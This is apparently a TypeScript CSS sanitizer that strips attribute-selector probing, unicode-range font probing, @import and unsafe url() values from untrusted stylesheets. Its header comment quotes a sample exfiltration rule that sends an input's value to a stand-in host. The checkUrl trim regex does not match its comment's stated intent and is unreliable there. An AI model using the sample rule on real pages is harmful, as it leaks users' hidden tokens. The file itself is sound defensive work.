/**
 * Semantic CSS sanitizer.
 *
 * Operates on the parsed rule/declaration tree (never on raw text), so
 * escape- and comment-based obfuscation is already normalized away by the
 * tokenizer before any policy decision is made.
 *
 * Threat model addressed:
 *  1. Attribute-selector exfiltration: `input[value^="a"] { background:
 *     url(//evil/?a) }` leaks a hidden token one character at a time.
 *     -> Selectors testing sensitive attribute *values* are removed;
 *        optionally, rules using prefix-class matchers on ANY attribute may
 *        not load absolute URLs (combo protection).
 *  2. unicode-range font probing: one @font-face per character, each with a
 *     distinct src URL, reveals which characters appear on the page.
 *     -> The `unicode-range` descriptor is stripped from @font-face.
 *  3. URL-based channels in general (@import of attacker CSS, javascript:
 *     urls, data: html, url() smuggled through custom properties / var()).
 *     -> Every url-bearing construct in every declaration value (including
 *        custom property values and image-set string arguments) is checked
 *        against a scheme/host/mime policy.
 */

import type {
  AtRule,
  BlockItem,
  ComponentValue,
  Declaration,
  QualifiedRule,
  Rule,
} from './parser.ts';
import { isBlockValue, isFunctionValue, isToken, parseStylesheet } from './parser.ts';
import { serializeStylesheet } from './serialize.ts';
import { tokenize } from './tokenizer.ts';
import type { Token } from './tokenizer.ts';

export interface UrlPolicy {
  /** Schemes allowed for absolute URLs. Default: ['https']. */
  allowedSchemes?: string[];
  /**
   * Host allowlist for absolute URLs (suffix match: 'example.com' also
   * allows 'cdn.example.com'). null = any host on an allowed scheme.
   * Set this to your own CDN hosts to make token exfiltration impossible
   * even if a selector-based check is ever bypassed. Default: null.
   */
  allowedHosts?: string[] | null;
  /** Allow relative URLs (resolved against the page origin). Default: true. */
  allowRelative?: boolean;
  /** Allow fragment-only references like `#icon`. Default: true. */
  allowFragments?: boolean;
  /**
   * Allowed mime pattern for data: URLs, or null to forbid data: entirely.
   * Default: common image and font types.
   */
  dataMimePattern?: RegExp | null;
}

export interface SanitizeOptions {
  urlPolicy?: UrlPolicy;
  /**
   * Attributes whose values may carry secrets. Attribute selectors that
   * test these attributes' values (any matcher) are removed.
   * Default: ['value'].
   */
  sensitiveAttributes?: string[];
  /**
   * Combo protection: a rule whose selector uses a prefix-class attribute
   * matcher (^= $= *= |=) on ANY attribute may not load absolute URLs, and
   * may not use var() inside URL-loading properties. Default: true.
   */
  comboProtection?: boolean;
  /** Drop selectors containing :visited (history probing). Default: true. */
  dropVisited?: boolean;
  /**
   * @import handling. false (default) drops all @import rules — imported
   * stylesheets are attacker-controlled CSS and must never be loaded.
   * Pass { allowedHosts } to permit imports from trusted hosts only.
   */
  allowImport?: false | { allowedHosts: string[] | null };
  /** Extra properties to drop (merged with the built-in blocklist). */
  blockedProperties?: string[];
  /** Keep at-rules the sanitizer does not know. Default: true. */
  allowUnknownAtRules?: boolean;
}

export interface SanitizeResult {
  css: string;
  warnings: string[];
}

const DEFAULT_DATA_MIME =
  /^(image\/(png|gif|jpe?g|webp|avif|svg\+xml|x-icon|vnd\.microsoft\.icon)|font\/(woff2?|ttf|otf|collection|sfnt))$/i;

/** Properties historically able to execute script or bind foreign behavior. */
const DEFAULT_BLOCKED_PROPERTIES = new Set([
  'behavior',
  '-moz-binding',
  '-webkit-binding',
  'binding',
  '-o-link',
  '-o-link-source',
]);

/** Properties whose values can trigger a network fetch. */
const URL_LOADING_PROPERTIES = new Set([
  'background',
  'background-image',
  'border-image',
  'border-image-source',
  'content',
  'cursor',
  'filter',
  'list-style',
  'list-style-image',
  'mask',
  'mask-image',
  '-webkit-mask',
  '-webkit-mask-image',
  'offset-path',
  'shape-outside',
  'src',
]);

/** Attribute matchers that can probe a value prefix/substring. */
const PREFIX_MATCHERS = new Set(['^=', '$=', '*=', '|=']);

const KEYFRAME_RULES = new Set([
  'keyframes',
  '-webkit-keyframes',
  '-moz-keyframes',
  '-o-keyframes',
]);

const RULE_CONTAINER_AT_RULES = new Set([
  'media',
  'supports',
  'container',
  'layer',
  'starting-style',
]);

interface Ctx {
  allowedSchemes: Set<string>;
  allowedHosts: string[] | null;
  allowRelative: boolean;
  allowFragments: boolean;
  dataMimePattern: RegExp | null;
  sensitiveAttributes: Set<string>;
  comboProtection: boolean;
  dropVisited: boolean;
  allowImport: false | { allowedHosts: string[] | null };
  blockedProperties: Set<string>;
  allowUnknownAtRules: boolean;
  warnings: string[];
}

export function sanitizeCss(input: string, options: SanitizeOptions = {}): SanitizeResult {
  const p = options.urlPolicy ?? {};
  const ctx: Ctx = {
    allowedSchemes: new Set((p.allowedSchemes ?? ['https']).map((s) => s.toLowerCase())),
    allowedHosts: p.allowedHosts !== undefined ? p.allowedHosts : null,
    allowRelative: p.allowRelative ?? true,
    allowFragments: p.allowFragments ?? true,
    dataMimePattern: p.dataMimePattern !== undefined ? p.dataMimePattern : DEFAULT_DATA_MIME,
    sensitiveAttributes: new Set(
      (options.sensitiveAttributes ?? ['value']).map((a) => a.toLowerCase()),
    ),
    comboProtection: options.comboProtection ?? true,
    dropVisited: options.dropVisited ?? true,
    allowImport: options.allowImport ?? false,
    blockedProperties: new Set([
      ...DEFAULT_BLOCKED_PROPERTIES,
      ...(options.blockedProperties ?? []).map((x) => x.toLowerCase()),
    ]),
    allowUnknownAtRules: options.allowUnknownAtRules ?? true,
    warnings: [],
  };

  const sheet = parseStylesheet(tokenize(input));
  const rules: Rule[] = [];
  for (const rule of sheet.rules) {
    const kept = sanitizeRule(rule, ctx, false);
    if (kept) rules.push(kept);
  }
  return { css: serializeStylesheet(rules), warnings: ctx.warnings };
}

// ---------------------------------------------------------------------------
// URL policy
// ---------------------------------------------------------------------------

interface UrlVerdict {
  ok: boolean;
  absolute: boolean;
  reason?: string;
}

function hostMatches(hostname: string, allowlist: string[]): boolean {
  const h = hostname.toLowerCase();
  return allowlist.some((entry) => h === entry || h.endsWith('.' + entry));
}

function checkUrl(
  raw: string,
  ctx: Ctx,
  opts: { rejectAbsolute?: boolean; hostOverride?: string[] | null } = {},
): UrlVerdict {
  // The URL parser strips ASCII tab/newline and trims C0 controls + space;
  // do the same before judging, or `java\tscript:` would slip through.
  const cleaned = raw
    .replace(/[\t\n\r]/g, '')
    .replace(/^[-\x20]+/, '')
    .replace(/[-\x20]+$/, '');
  if (cleaned === '') return { ok: false, absolute: false, reason: 'empty URL' };

  if (cleaned.startsWith('#')) {
    return ctx.allowFragments
      ? { ok: true, absolute: false }
      : { ok: false, absolute: false, reason: 'fragment URLs not allowed' };
  }

  const schemeMatch = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(cleaned);
  if (schemeMatch) {
    const scheme = schemeMatch[1].toLowerCase();
    if (scheme === 'data') {
      const mime = /^data:([^;,]*)/.exec(cleaned)?.[1] ?? '';
      const ok = ctx.dataMimePattern !== null && ctx.dataMimePattern.test(mime);
      return ok
        ? { ok: true, absolute: false }
        : { ok: false, absolute: false, reason: `data: URL with disallowed type '${mime || 'text/plain'}'` };
    }
    if (!ctx.allowedSchemes.has(scheme)) {
      return { ok: false, absolute: true, reason: `scheme '${scheme}:' not allowed` };
    }
    if (opts.rejectAbsolute) {
      return { ok: false, absolute: true, reason: 'absolute URL in attribute-probing rule' };
    }
    const hosts = opts.hostOverride !== undefined ? opts.hostOverride : ctx.allowedHosts;
    if (hosts !== null) {
      let hostname: string;
      try {
        hostname = new URL(cleaned).hostname;
      } catch {
        return { ok: false, absolute: true, reason: 'unparseable URL' };
      }
      if (!hostMatches(hostname, hosts)) {
        return { ok: false, absolute: true, reason: `host '${hostname}' not in allowlist` };
      }
    }
    return { ok: true, absolute: true };
  }

  if (cleaned.startsWith('//')) {
    // Protocol-relative: inherits the page scheme (https on any sane host).
    if (!ctx.allowedSchemes.has('https')) {
      return { ok: false, absolute: true, reason: 'protocol-relative URL not allowed' };
    }
    if (opts.rejectAbsolute) {
      return { ok: false, absolute: true, reason: 'absolute URL in attribute-probing rule' };
    }
    const hosts = opts.hostOverride !== undefined ? opts.hostOverride : ctx.allowedHosts;
    if (hosts !== null) {
      let hostname: string;
      try {
        hostname = new URL('https:' + cleaned).hostname;
      } catch {
        return { ok: false, absolute: true, reason: 'unparseable URL' };
      }
      if (!hostMatches(hostname, hosts)) {
        return { ok: false, absolute: true, reason: `host '${hostname}' not in allowlist` };
      }
    }
    return { ok: true, absolute: true };
  }

  return ctx.allowRelative
    ? { ok: true, absolute: false }
    : { ok: false, absolute: false, reason: 'relative URLs not allowed' };
}

// ---------------------------------------------------------------------------
// Value sanitization
// ---------------------------------------------------------------------------

function containsFunction(values: ComponentValue[], name: string): boolean {
  for (const cv of values) {
    if (isFunctionValue(cv)) {
      if (cv.name.toLowerCase() === name) return true;
      if (containsFunction(cv.value, name)) return true;
    } else if (isBlockValue(cv)) {
      if (containsFunction(cv.value, name)) return true;
    }
  }
  return false;
}

/**
 * Returns the sanitized component values, or null if the whole declaration
 * must be dropped.
 */
function sanitizeValue(
  values: ComponentValue[],
  ctx: Ctx,
  where: string,
  opts: { rejectAbsolute?: boolean } = {},
): ComponentValue[] | null {
  const out: ComponentValue[] = [];
  for (const cv of values) {
    const kept = sanitizeComponentValue(cv, ctx, where, opts);
    if (kept === null) return null;
    out.push(kept);
  }
  return out;
}

function sanitizeComponentValue(
  cv: ComponentValue,
  ctx: Ctx,
  where: string,
  opts: { rejectAbsolute?: boolean },
): ComponentValue | null {
  if (isBlockValue(cv)) {
    const inner = sanitizeValue(cv.value, ctx, where, opts);
    return inner === null ? null : { ...cv, value: inner };
  }
  if (isFunctionValue(cv)) {
    const name = cv.name.toLowerCase();
    if (name === 'expression') {
      ctx.warnings.push(`Dropped ${where}: expression() is not allowed`);
      return null;
    }
    if (name === 'url') {
      // Quoted form: url("..."). Inner values must be whitespace + one string.
      let seen = false;
      for (const inner of cv.value) {
        if (isToken(inner) && inner.type === 'whitespace') continue;
        if (isToken(inner) && inner.type === 'string' && !seen) {
          seen = true;
          const verdict = checkUrl(inner.value, ctx, opts);
          if (!verdict.ok) {
            ctx.warnings.push(`Dropped ${where}: ${verdict.reason}`);
            return null;
          }
          continue;
        }
        ctx.warnings.push(`Dropped ${where}: malformed url()`);
        return null;
      }
      if (!seen) {
        ctx.warnings.push(`Dropped ${where}: empty url()`);
        return null;
      }
      return cv;
    }
    if (name === 'image-set' || name === '-webkit-image-set' || name === 'src') {
      // String arguments in these functions are URLs.
      const inner: ComponentValue[] = [];
      for (const item of cv.value) {
        if (isToken(item) && item.type === 'string') {
          const verdict = checkUrl(item.value, ctx, opts);
          if (!verdict.ok) {
            ctx.warnings.push(`Dropped ${where}: ${verdict.reason}`);
            return null;
          }
          inner.push(item);
          continue;
        }
        const kept = sanitizeComponentValue(item, ctx, where, opts);
        if (kept === null) return null;
        inner.push(kept);
      }
      return { ...cv, value: inner };
    }
    const inner = sanitizeValue(cv.value, ctx, where, opts);
    return inner === null ? null : { ...cv, value: inner };
  }
  // Plain token.
  switch (cv.type) {
    case 'url': {
      const verdict = checkUrl(cv.value, ctx, opts);
      if (!verdict.ok) {
        ctx.warnings.push(`Dropped ${where}: ${verdict.reason}`);
        return null;
      }
      return cv;
    }
    case 'bad-url':
    case 'bad-string':
      ctx.warnings.push(`Dropped ${where}: malformed ${cv.type}`);
      return null;
    default:
      return cv;
  }
}

// ---------------------------------------------------------------------------
// Selector sanitization
// ---------------------------------------------------------------------------

interface AttrSelectorInfo {
  name: string;
  matcher: string | null;
}

/** Parse the inside of a `[ ... ]` block. Returns 'invalid' when malformed. */
function parseAttributeSelector(values: ComponentValue[]): AttrSelectorInfo | 'invalid' {
  const toks = values;
  let i = 0;
  const skipWs = () => {
    while (i < toks.length && isToken(toks[i]) && (toks[i] as Token).type === 'whitespace') i++;
  };
  const isDelim = (v: ComponentValue | undefined, ch: string) =>
    v !== undefined && isToken(v) && v.type === 'delim' && v.value === ch;

  skipWs();
  // Optional namespace: `ns|`, `*|`, or `|`.
  if (i < toks.length) {
    const t = toks[i];
    const isIdentLike = isToken(t) && t.type === 'ident';
    if ((isIdentLike || isDelim(t, '*')) && isDelim(toks[i + 1], '|') && !isDelim(toks[i + 2], '=')) {
      i += 2;
    } else if (isDelim(t, '|') && !isDelim(toks[i + 1], '=')) {
      i += 1;
    }
  }
  skipWs();
  const nameTok = toks[i];
  if (nameTok === undefined || !isToken(nameTok) || nameTok.type !== 'ident') {
    return 'invalid';
  }
  const name = nameTok.value.toLowerCase();
  i++;
  skipWs();
  if (i >= toks.length) return { name, matcher: null };

  let matcher: string;
  const t = toks[i];
  if (isDelim(t, '=')) {
    matcher = '=';
    i++;
  } else if (
    isToken(t) &&
    t.type === 'delim' &&
    ['~', '^', '$', '*', '|'].includes(t.value) &&
    isDelim(toks[i + 1], '=')
  ) {
    matcher = t.value + '=';
    i += 2;
  } else {
    return 'invalid';
  }
  skipWs();
  const valTok = toks[i];
  if (
    valTok === undefined ||
    !isToken(valTok) ||
    (valTok.type !== 'ident' && valTok.type !== 'string')
  ) {
    return 'invalid';
  }
  i++;
  skipWs();
  // Optional case-sensitivity modifier: i / I / s / S.
  const mod = toks[i];
  if (mod !== undefined && isToken(mod) && mod.type === 'ident') {
    if (!/^[is]$/i.test(mod.value)) return 'invalid';
    i++;
    skipWs();
  }
  return i === toks.length ? { name, matcher } : 'invalid';
}

interface SelectorVerdict {
  ok: boolean;
  reason?: string;
  hasPrefixMatcher: boolean;
}

function checkSelectorValues(values: ComponentValue[], ctx: Ctx): SelectorVerdict {
  let hasPrefixMatcher = false;
  for (let idx = 0; idx < values.length; idx++) {
    const cv = values[idx];
    if (isBlockValue(cv)) {
      if (cv.start === '[') {
        const info = parseAttributeSelector(cv.value);
        if (info === 'invalid') {
          return { ok: false, reason: 'unparseable attribute selector', hasPrefixMatcher };
        }
        if (info.matcher !== null) {
          if (ctx.sensitiveAttributes.has(info.name)) {
            return {
              ok: false,
              reason: `attribute selector probes sensitive attribute '${info.name}'`,
              hasPrefixMatcher,
            };
          }
          if (PREFIX_MATCHERS.has(info.matcher)) hasPrefixMatcher = true;
        }
        continue;
      }
      const nested = checkSelectorValues(cv.value, ctx);
      if (!nested.ok) return { ok: false, reason: nested.reason, hasPrefixMatcher };
      hasPrefixMatcher = hasPrefixMatcher || nested.hasPrefixMatcher;
      continue;
    }
    if (isFunctionValue(cv)) {
      // :not(), :is(), :has(), :nth-child(... of <selector>) etc.
      const nested = checkSelectorValues(cv.value, ctx);
      if (!nested.ok) return { ok: false, reason: nested.reason, hasPrefixMatcher };
      hasPrefixMatcher = hasPrefixMatcher || nested.hasPrefixMatcher;
      continue;
    }
    if (cv.type === 'colon' && ctx.dropVisited) {
      const next = values[idx + 1];
      if (
        next !== undefined &&
        isToken(next) &&
        next.type === 'ident' &&
        next.value.toLowerCase() === 'visited'
      ) {
        return { ok: false, reason: ':visited selector (history probing)', hasPrefixMatcher };
      }
    }
  }
  return { ok: true, hasPrefixMatcher };
}

function splitSelectorList(prelude: ComponentValue[]): ComponentValue[][] {
  const groups: ComponentValue[][] = [[]];
  for (const cv of prelude) {
    if (isToken(cv) && cv.type === 'comma') {
      groups.push([]);
    } else {
      groups[groups.length - 1].push(cv);
    }
  }
  return groups;
}

// ---------------------------------------------------------------------------
// Rule sanitization
// ---------------------------------------------------------------------------

function sanitizeDeclaration(
  decl: Declaration,
  ctx: Ctx,
  flags: { inFontFace: boolean; combo: boolean },
): Declaration | null {
  const lower = decl.name.toLowerCase();
  const where = `declaration '${decl.name}'`;

  if (lower.startsWith('--')) {
    // Custom properties can smuggle url() into var() consumers, so they are
    // held to the same value policy as any other declaration.
    const value = sanitizeValue(decl.value, ctx, where, { rejectAbsolute: flags.combo });
    return value === null ? null : { ...decl, value };
  }
  if (ctx.blockedProperties.has(lower)) {
    ctx.warnings.push(`Dropped ${where}: property is blocked`);
    return null;
  }
  if (flags.inFontFace && lower === 'unicode-range') {
    ctx.warnings.push(
      `Dropped ${where}: unicode-range enables per-character font-load probing`,
    );
    return null;
  }
  if (
    flags.combo &&
    URL_LOADING_PROPERTIES.has(lower) &&
    containsFunction(decl.value, 'var')
  ) {
    ctx.warnings.push(
      `Dropped ${where}: var() in URL-loading property inside attribute-probing rule`,
    );
    return null;
  }
  const value = sanitizeValue(decl.value, ctx, where, { rejectAbsolute: flags.combo });
  return value === null ? null : { ...decl, value };
}

function sanitizeBlockItems(
  items: BlockItem[],
  ctx: Ctx,
  flags: { inFontFace: boolean; combo: boolean },
): BlockItem[] {
  const out: BlockItem[] = [];
  for (const item of items) {
    if (item.kind === 'declaration') {
      const kept = sanitizeDeclaration(item, ctx, flags);
      if (kept) out.push(kept);
    } else {
      const kept = sanitizeRule(item, ctx, flags.combo);
      if (kept) out.push(kept);
    }
  }
  return out;
}

function sanitizeQualifiedRule(rule: QualifiedRule, ctx: Ctx, parentCombo: boolean): QualifiedRule | null {
  const groups = splitSelectorList(rule.prelude);
  const keptPrelude: ComponentValue[] = [];
  let combo = parentCombo;
  let keptCount = 0;
  for (const group of groups) {
    const verdict = checkSelectorValues(group, ctx);
    if (!verdict.ok) {
      ctx.warnings.push(`Dropped selector: ${verdict.reason}`);
      continue;
    }
    if (ctx.comboProtection && verdict.hasPrefixMatcher) combo = true;
    if (keptCount > 0) {
      keptPrelude.push({ type: 'comma' }, { type: 'whitespace' });
    }
    keptPrelude.push(...group);
    keptCount++;
  }
  if (keptCount === 0) return null;

  const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: false, combo });
  if (block.length === 0) return null;
  return { kind: 'qualified', prelude: keptPrelude, block };
}

function sanitizeKeyframeBlock(items: BlockItem[], ctx: Ctx): BlockItem[] {
  const out: BlockItem[] = [];
  for (const item of items) {
    if (item.kind === 'qualified') {
      const block = sanitizeBlockItems(item.block, ctx, { inFontFace: false, combo: false });
      if (block.length > 0) out.push({ ...item, block });
    }
    // Stray declarations directly inside @keyframes are invalid; drop them.
  }
  return out;
}

function sanitizeAtRule(rule: AtRule, ctx: Ctx, parentCombo: boolean): AtRule | null {
  const name = rule.name.toLowerCase();

  if (name === 'charset') {
    ctx.warnings.push('Dropped @charset (output is re-encoded as UTF-8)');
    return null;
  }

  if (name === 'import') {
    if (ctx.allowImport === false) {
      ctx.warnings.push('Dropped @import: imported stylesheets are not allowed');
      return null;
    }
    // Find the URL: first url token, url() function, or string in the prelude.
    for (const cv of rule.prelude) {
      let raw: string | null = null;
      if (isToken(cv) && cv.type === 'url') raw = cv.value;
      else if (isToken(cv) && cv.type === 'string') raw = cv.value;
      else if (isFunctionValue(cv) && cv.name.toLowerCase() === 'url') {
        const str = cv.value.find((v) => isToken(v) && v.type === 'string');
        if (str && isToken(str) && str.type === 'string') raw = str.value;
      }
      if (raw !== null) {
        const verdict = checkUrl(raw, ctx, { hostOverride: ctx.allowImport.allowedHosts });
        if (!verdict.ok) {
          ctx.warnings.push(`Dropped @import: ${verdict.reason}`);
          return null;
        }
        return rule;
      }
    }
    ctx.warnings.push('Dropped @import: no URL found');
    return null;
  }

  if (name === 'namespace') {
    // Namespace URLs are identifiers, never fetched.
    return rule;
  }

  if (RULE_CONTAINER_AT_RULES.has(name)) {
    if (rule.block === null) return rule; // e.g. `@layer a, b;`
    const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: false, combo: parentCombo });
    // An emptied container is dead weight — except @layer, whose mere
    // presence establishes cascade-layer order.
    if (block.length === 0 && name !== 'layer') return null;
    return { ...rule, block };
  }

  if (name === 'scope') {
    const verdict = checkSelectorValues(rule.prelude, ctx);
    if (!verdict.ok) {
      ctx.warnings.push(`Dropped @scope: ${verdict.reason}`);
      return null;
    }
    if (rule.block === null) return rule;
    const combo =
      parentCombo || (ctx.comboProtection && verdict.hasPrefixMatcher);
    const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: false, combo });
    if (block.length === 0) return null;
    return { ...rule, block };
  }

  if (name === 'font-face') {
    if (rule.block === null) return null;
    const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: true, combo: false });
    if (block.length === 0) return null;
    return { ...rule, block };
  }

  if (KEYFRAME_RULES.has(name)) {
    if (rule.block === null) return null;
    return { ...rule, block: sanitizeKeyframeBlock(rule.block, ctx) };
  }

  if (name === 'property' || name === 'page' || name === 'counter-style' ||
      name === 'font-feature-values' || name === 'viewport' || name === 'position-try') {
    if (rule.block === null) return rule;
    const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: false, combo: false });
    return { ...rule, block };
  }

  // Unknown at-rule.
  if (!ctx.allowUnknownAtRules) {
    ctx.warnings.push(`Dropped unknown at-rule @${name}`);
    return null;
  }
  const prelude = sanitizeValue(rule.prelude, ctx, `@${name} prelude`);
  if (prelude === null) return null;
  const preludeCheck = checkSelectorValues(prelude, ctx);
  if (!preludeCheck.ok) {
    ctx.warnings.push(`Dropped @${name}: ${preludeCheck.reason}`);
    return null;
  }
  if (rule.block === null) return { ...rule, prelude };
  const block = sanitizeBlockItems(rule.block, ctx, { inFontFace: false, combo: parentCombo });
  return { ...rule, prelude, block };
}

function sanitizeRule(rule: Rule, ctx: Ctx, parentCombo: boolean): Rule | null {
  if (rule.kind === 'qualified') return sanitizeQualifiedRule(rule, ctx, parentCombo);
  return sanitizeAtRule(rule, ctx, parentCombo);
}
